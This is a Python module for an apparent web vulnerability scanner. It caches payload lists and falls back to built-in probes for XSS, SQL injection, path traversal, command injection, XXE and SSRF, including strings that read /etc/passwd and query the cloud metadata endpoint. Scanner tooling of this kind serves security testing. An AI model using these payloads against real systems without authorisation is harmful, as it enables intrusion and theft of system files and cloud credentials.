"""
Gestor centralizado de payloads.
Carga todos los payloads una sola vez y los cachea en memoria.
"""
import os
from core.logger import get_logger


class PayloadManager:
    """
    Gestor centralizado de payloads con caching.
    Elimina carga duplicada de archivos en cada módulo.
    """
    
    _instance = None
    _payloads = {}
    
    def __new__(cls, config=None):
        """Singleton para compartir payloads entre módulos."""
        if cls._instance is None:
            cls._instance = super().__new__(cls)
            cls._instance._initialized = False
        return cls._instance
    
    def __init__(self, config=None):
        if self._initialized:
            return
        
        self.config = config or {}
        self.logger = get_logger("payload_manager")
        self.payloads_dir = self.config.get('payloads_dir', 'payloads')
        self._initialized = True
        
        # Cargar todos los payloads al inicializar
        self._load_all_payloads()
    
    def _load_all_payloads(self):
        """Carga todos los archivos de payloads disponibles."""
        payload_files = {
            'xss': 'xss.txt',
            'sqli': 'sqli.txt',
            'lfi': 'lfi.txt',
            'cmdi': 'cmdi.txt',
            'xxe': 'xxe.txt',
            'ssrf': 'ssrf.txt'
        }
        
        for vuln_type, filename in payload_files.items():
            filepath = os.path.join(self.payloads_dir, filename)
            self._payloads[vuln_type] = self._load_payload_file(filepath, vuln_type)
    
    def _load_payload_file(self, filepath, vuln_type):
        """Carga payloads desde un archivo."""
        payloads = []
        
        try:
            if os.path.exists(filepath):
                with open(filepath, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            payloads.append(line)
                
                self.logger.info(f"Cargados {len(payloads)} payloads de {vuln_type}")
            else:
                self.logger.debug(f"Archivo de payloads no encontrado: {filepath}")
                payloads = self._get_default_payloads(vuln_type)
        
        except Exception as e:
            self.logger.error(f"Error cargando payloads de {filepath}: {e}")
            payloads = self._get_default_payloads(vuln_type)
        
        return payloads
    
    def get_payloads(self, vuln_type, max_count=None):
        """
        Obtiene payloads para un tipo de vulnerabilidad.
        
        Args:
            vuln_type: Tipo de vulnerabilidad (xss, sqli, lfi, etc.)
            max_count: Número máximo de payloads a retornar
            
        Returns:
            Lista de payloads
        """
        payloads = self._payloads.get(vuln_type, [])
        
        if not payloads:
            self.logger.warning(f"No hay payloads disponibles para {vuln_type}")
            payloads = self._get_default_payloads(vuln_type)
        
        if max_count:
            return payloads[:max_count]
        
        return payloads
    
    def _get_default_payloads(self, vuln_type):
        """Retorna payloads por defecto si no hay archivo."""
        defaults = {
            'xss': [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "javascript:alert('XSS')",
                "<iframe src=\"javascript:alert('XSS')\">",
            ],
            'sqli': [
                "'",
                "\"",
                "' OR '1'='1",
                "\" OR \"1\"=\"1",
                "' OR '1'='1' --",
                "' OR '1'='1' #",
            ],
            'lfi': [
                '../../../etc/passwd',
                '..\\..\\..\\windows\\win.ini',
                '../../../../etc/passwd',
                '/etc/passwd',
                'C:\\windows\\win.ini',
            ],
            'cmdi': [
                '; ls',
                '| ls',
                '& dir',
                '; cat /etc/passwd',
                '| whoami',
            ],
            'xxe': [
                '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            ],
            'ssrf': [
                'http://localhost',
                'http://127.0.0.1',
                'http://169.254.169.254/latest/meta-data/',
            ]
        }
        
        return defaults.get(vuln_type, [])
    
    def add_custom_payloads(self, vuln_type, payloads):
        """Añade payloads personalizados."""
        if vuln_type not in self._payloads:
            self._payloads[vuln_type] = []
        
        self._payloads[vuln_type].extend(payloads)
        self.logger.info(f"Añadidos {len(payloads)} payloads personalizados para {vuln_type}")
    
    def reload_payloads(self):
        """Recarga todos los payloads desde disco."""
        self._payloads.clear()
        self._load_all_payloads()
        self.logger.info("Payloads recargados")
